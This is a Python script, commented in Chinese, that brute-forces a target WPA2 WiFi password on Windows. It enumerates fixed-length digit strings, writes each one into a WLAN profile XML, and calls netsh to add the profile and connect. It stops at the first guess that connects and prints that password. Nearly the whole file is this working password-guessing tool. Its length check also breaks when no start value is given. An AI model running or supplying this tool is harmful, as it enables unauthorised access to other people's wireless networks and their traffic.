import subprocess, time, os, re
import string
import itertools
import argparse

def run(cmd):
    return subprocess.run(cmd, capture_output=True, text=True, encoding="utf-8", errors="ignore")


def parse_interfaces(output: str):
    blocks = re.split(r"\n\s*\n", output.strip(), flags=re.S)
    infos = []
    for blk in blocks:
        if not re.search(r"(State|状态|SSID)", blk, re.I):
            continue

        def pick(pattern):
            m = re.search(pattern, blk, re.I)
            return m.group(1).strip() if m else None

        state = pick(r"(?:State|状态)\s*:\s*([^\r\n]+)")
        ssid  = pick(r"(?:(?<!B)SSID|(?<!B)ssid)\s*:\s*([^\r\n]+)")
        name  = pick(r"(?:Name|名称)\s*:\s*([^\r\n]+)")
        typ   = pick(r"(?:Type|类型)\s*:\s*([^\r\n]+)")
        infos.append({"state": state, "ssid": ssid, "name": name, "type": typ, "raw": blk})
    return infos

def is_connected_to(ssid_target: str):
    res = run(["netsh", "wlan", "show", "interfaces"])
    infos = parse_interfaces(res.stdout)
    ssid_target_norm = (ssid_target or "").strip().casefold()
    for itf in infos:
        st = (itf.get("state") or "").strip().casefold()
        ssid_now = (itf.get("ssid") or "").strip().casefold()
        # 同时满足：状态=connected/已连接 且 SSID 精确等于目标
        if st in ("connected", "已连接") and ssid_now == ssid_target_norm:
            return True
    return False

def connect_wifi_from_profile(profile_path: str, ssid: str, password: str = None, timeout_sec: int = 30):
    if not os.path.isabs(profile_path):
        profile_path = os.path.abspath(profile_path)

    if password is not None:
        xml = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''
        with open(profile_path, "w", encoding="utf-8") as f:
            f.write(xml)

    run(["netsh", "wlan", "disconnect"])
    run(["netsh", "wlan", "delete", "profile", f"name={ssid}"])
    add_r = run(["netsh", "wlan", "add", "profile", f"filename={profile_path}"])
    if add_r.returncode != 0:
        print("添加配置失败：", add_r.stdout or add_r.stderr)
        return False

    conn_r = run(["netsh", "wlan", "connect", f"name={ssid}", f"ssid={ssid}"])

    # 给系统 2 秒缓冲再开始轮询
    time.sleep(2)

    # 轮询等待，直到状态=已连接 且 SSID 匹配
    last_dump = None
    for _ in range(timeout_sec):
        show_r = run(["netsh", "wlan", "show", "interfaces"])
        last_dump = show_r.stdout
        if is_connected_to(ssid):
            return True
        time.sleep(1)

    # 失败时把最后一次的接口信息打出来，方便诊断
    # print("最后一次接口状态：\n", last_dump)
    return False


# def generate_fixed_length_combinations(chars, length):
#     """
#     一个生成器，用于生成所有固定长度的字符串组合。
    
#     参数:
#     chars (str): 用于组合的字符集。
#     length (int): 字符串的固定长度。
#     """
#     for item_tuple in itertools.product(chars, repeat=length):
#         yield ''.join(item_tuple)

def generate_fixed_length_combinations(chars, length, start_from=None):
    """
    从指定起点开始生成固定长度组合。
    如果 start_from=None，则从头开始。
    """
    started = (start_from is None)
    for item_tuple in itertools.product(chars, repeat=length):
        s = ''.join(item_tuple)
        if not started:
            if s == start_from:
                started = True
            else:
                continue  # 还没到起点，跳过
        yield s

parser = argparse.ArgumentParser(description="WiFi")

parser.add_argument(
        "-l", "--length",
        type=int,
        help="start value length for trying",
        required=False,
        default=8
    )

parser.add_argument(
        "-s", "--start_value",
        type=str,
        help="start value for trying",
        required=False,
        default=None
    )

parser.add_argument(
        "-t", "--target",
        type=str,
        help="target WiFi",
        required=True,
        default=None
    )

args = parser.parse_args()

# string.printable 包含所有ASCII字符 (约100个)
# charset = string.printable
charset = string.digits  # 这里只用数字
fixed_length = args.length
# total_combinations = len(charset) ** fixed_length
start_value = args.start_value
# start_value = "19700000"

if fixed_length != len(start_value):
    parser.error(f"------start_value must be {fixed_length}------")


my_generator = generate_fixed_length_combinations(charset, fixed_length, start_value)

count = 0
start_time = time.time()
start = start_time
ssid = args.target
# ssid = "Qin"

profile_path = "F:\FLUX.1_dev\wifi_profile.xml"

try:
    for combo in my_generator:
        count += 1
        password = combo
        if connect_wifi_from_profile(profile_path, ssid, password, 1):
            print("################################################################################################################################################################")
            print(f"------You have connected sucessfully------Password: {combo}------")
            print("################################################################################################################################################################")
            break
        
        end_time = time.time()
        print(f"------Trying code: {combo}------You have failed {count} times------Using time:{end_time - start_time: .6f} s------Total time:{int((end_time-start) // 3600)}h{int((end_time-start) % 3600) // 60}m------")
        # print(f"using time: {end_time - start_time: .6f} s\n")
        start_time = end_time
        
            
except KeyboardInterrupt:
    print("\n------Interupt by Sorryqin------")

# print(f"\nfinished")